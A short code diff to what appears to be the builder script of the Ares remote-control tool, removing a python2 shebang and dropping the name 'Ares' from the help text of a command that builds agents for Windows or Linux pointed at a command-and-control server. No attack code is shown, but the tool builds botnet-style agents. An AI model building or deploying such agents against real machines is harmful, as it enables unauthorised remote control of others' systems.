@@ -1,5 +1,3 @@
-#!/usr/bin/env python2
-
 import os
 import shutil
 import tempfile
@@ -50,7 +48,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
 
 def main():
     from argparse import ArgumentParser
-    parser = ArgumentParser(description="Builds an Ares agent.")
+    parser = ArgumentParser(description="Builds an agent.")
     parser.add_argument('-p', '--platform', required=True, help="Target platform (Windows, Linux).")
     parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
     parser.add_argument('-o', '--output', required=True, help="Output file name.")
